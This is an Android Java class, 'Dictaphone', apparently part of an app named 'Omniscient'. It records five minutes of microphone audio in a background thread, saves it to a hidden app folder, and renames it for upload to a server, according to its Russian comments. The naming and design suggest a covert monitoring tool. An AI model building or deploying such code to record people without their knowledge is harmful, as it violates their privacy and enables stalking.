package com.postal.omniscient.postal.downloadFiles;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Записываем звук диктофона
 * Created by Александр on 23.07.2016.
 */
public class Dictaphone extends Thread {
    private AdapterDownloadFlag is_downloadFlag;
    private String record_name = "MicrophoneRecord";
    private Context context;
    private File audiofile;
    private MediaRecorder recorder;
    private Boolean recordstarted;
    //private CountDownTimer timer;
    private String Msg = "MyMsg";
    private String no_written = "no_written_";
    private File tempFile = null;
    private String time = new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
            .format(new Date());

    public Dictaphone(AdapterDownloadFlag is_downloadFlag, Context context) {
        this.is_downloadFlag = is_downloadFlag;
        this.context = context;
    }

    @Override
    public void run() {
        is_downloadFlag.setDictaphoneIsWork(true);
        startDict();

    }
    //запуск записи
    private void startDict() {
        try {
            String file_name = no_written + "_" + time;
            recordstarted = true;
            //записываем пока true
            if (recordstarted) {
                //путь к файлу для записи
                File sampleDir = new File(context.getFilesDir(), "/Omniscient/Microphone_Record");
                if (!sampleDir.exists()) {
                    sampleDir.mkdirs();
                }

                try {
                    tempFile = File.createTempFile(file_name, ".mp3", sampleDir);
                    audiofile = tempFile;
                } catch (IOException e) {
                    e.printStackTrace();
                }
                //готовимся к записи
                recorder = new MediaRecorder();

                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(audiofile.getAbsolutePath());
                try {
                    recorder.prepare();
                } catch (IllegalStateException e) {
                    Log.i("MyMsg", "EROR1 " + e.toString());
                } catch (IOException e) {
                    Log.i("MyMsg", "EROR2 " + e.toString());
                }
                //начинаем запись
                try {
                    recorder.start();
                } catch (Exception e) {
                    Log.i("MyMsg", "EROR3 " + e.toString());
                }

            }
            //запускаем таймер на 5 минут по окончании запись останавливается
            new Thread("DictaphoneRecordStop") {
                @Override
                public void run() {
                    long t = 1000 * 60 * 5;
                    try {
                        sleep(t);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    sptopRecord();
                }
            }.start();

        }catch (Exception e){Log.i("MyMsg", "DictaphoneRecordStop! ");}
    }
    //останавливаем запись
    public void sptopRecord(){
        try {
            if (recordstarted) {
                recorder.stop();
                recordstarted = false;
                is_downloadFlag.setDictaphoneIsWork(false);
                recorder.release();
                recorder = null;
                renameFile();
                EventBus.getDefault().post(new EventBusData("dictaphone_off"));
            }
        }catch (Exception e){Log.i("MyMsg", "Error sptopRecord");}
    }
    //перейменовуем файл для отправки на сервер
    private void renameFile() {
        try {
            File dir = new File(context.getFilesDir(), "/Omniscient/Microphone_Record");
            if (dir.exists()) { //context.getFilesDir()

                File from = tempFile;
                File to = new File(dir, time + "_" + record_name + ".mp3");
                if (from.exists())
                    from.renameTo(to);
            }
        }catch (Exception e){Log.i("MyMsg", "Error renameFile Dictaphone");}
    }
}
